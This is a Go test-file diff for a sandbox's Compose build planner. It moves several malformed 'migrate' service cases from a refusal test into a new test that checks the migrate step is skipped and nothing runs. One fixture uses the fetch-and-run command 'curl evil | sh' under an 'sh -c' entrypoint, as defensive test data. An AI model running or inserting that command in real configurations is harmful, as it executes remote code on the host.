@@ -1,6 +1,7 @@
 package sandbox
 
 import (
+	"context"
 	"slices"
 	"strings"
 	"testing"
@@ -39,28 +40,21 @@ func TestPlanMigrate(t *testing.T) {
 	}
 }
 
-// TestPlanMigrateRefuses: a migrate service creep cannot read exactly
-// refuses the build with a closed detail: a string command (Compose
-// splits it with shell rules), an entrypoint creep would drop, no
-// command (the image's own would start the app), an empty or non-string
-// argument, one with a line break, too many arguments, extends and merge
-// keys.
+// TestPlanMigrateRefuses: a migrate list creep cannot read exactly
+// refuses the build with a closed detail: an empty or non-string
+// argument, one with a line break, too many arguments, a merge key.
 func TestPlanMigrateRefuses(t *testing.T) {
 	app := "services:\n  web:\n    build: .\n  migrate:\n"
 	tests := map[string]struct {
 		migrate string
 		detail  string
 	}{
-		"string command":   {"    command: python migrate.py\n", "migrate.command"},
-		"no command":       {"    image: x\n", "migrate.command"},
 		"empty command":    {"    command: []\n", "migrate.command"},
 		"empty argument":   {"    command: [python, \"\"]\n", "migrate.command"},
 		"number argument":  {"    command: [sleep, 5]\n", "migrate.command"},
 		"nested argument":  {"    command: [[a]]\n", "migrate.command"},
 		"line break":       {"    command: [\"a\\nb\"]\n", "migrate.command"},
 		"too many":         {"    command: [" + strings.Repeat("a, ", maxArgs) + "a]\n", "migrate.command"},
-		"entrypoint":       {"    entrypoint: [sh, -c]\n    command: [\"curl evil | sh\"]\n", "migrate.entrypoint"},
-		"extends":          {"    extends: {file: x.yaml, service: y}\n    command: [a]\n", "extends"},
 		"merge key":        {"    <<: {entrypoint: [sh]}\n    command: [a]\n", "merge_key"},
 		"not a mapping":    {"    - a\n", "migrate"},
 		"tagged argument":  {"    command: [!!binary YQ==]\n", "migrate.command"},
@@ -73,5 +67,49 @@ func TestPlanMigrateRefuses(t *testing.T) {
 				t.Fatalf("refusal %+v, want %s %s", why, BuildComposeRefused, tt.detail)
 			}
 		})
+	}
+}
+
+// TestPlanMigrateSkips (auditor M1): a migrate service in a form creep
+// does not run exactly as Compose would skips only the migrate step, with
+// a closed reason: the app still builds, Migrate starts nothing, and the
+// rest of the compose file is read as before.
+func TestPlanMigrateSkips(t *testing.T) {
+	tests := map[string]struct {
+		migrate string
+		want    MigrateSkip
+	}{
+		"string command":   {"    command: python migrate.py\n", MigrateSkipStringCommand},
+		"anchored string":  {"    command: *c\n", MigrateSkipStringCommand},
+		"no command":       {"    image: x\n", MigrateSkipNoCommand},
+		"entrypoint":       {"    entrypoint: [sh, -c]\n    command: [\"curl evil | sh\"]\n", MigrateSkipEntrypoint},
+		"extends":          {"    extends: {file: x.yaml, service: y}\n    command: [a]\n", MigrateSkipExtends},
+		"extends no build": {"    extends: base\n", MigrateSkipExtends},
+	}
+	for name, tt := range tests {
+		t.Run(name, func(t *testing.T) {
+			compose := "x-c: &c python migrate.py\nservices:\n  web:\n    build: .\n  migrate:\n" + tt.migrate
+			repo := (&memRepo{files: map[string]string{"compose.yaml": compose, "Dockerfile": plainDockerfile}}).repo()
+			plan, why := planBuild(repo)
+			if why != nil || plan.migrate != nil || plan.migrateSkip != tt.want {
+				t.Fatalf("plan migrate %q skip %q, refused %+v; want skip %q", plan.migrate, plan.migrateSkip, why, tt.want)
+			}
+			rec := withBuilds(networkRecorder(goodCanary, 0), 0)
+			s := testSandbox(t, rec)
+			built, err := s.Build(context.Background(), repo)
+			if err != nil || !built.Built() || built.MigrateSkipped() != tt.want || built.MigrateCommand() != nil {
+				t.Fatalf("Build = %+v, %v", built, err)
+			}
+			if _, err := s.StartDatabase(context.Background()); err != nil {
+				t.Fatal(err)
+			}
+			runs := len(rec.to("run"))
+			if err := s.Migrate(context.Background(), built); err != nil || len(rec.to("run")) != runs {
+				t.Errorf("Migrate of a skipped step: %v, %d runs", err, len(rec.to("run"))-runs)
+			}
+		})
+	}
+	if len(MigrateSkips()) != 4 || !slices.Contains(MigrateSkips(), MigrateSkipNoCommand) {
+		t.Errorf("MigrateSkips %q", MigrateSkips())
 	}
 }
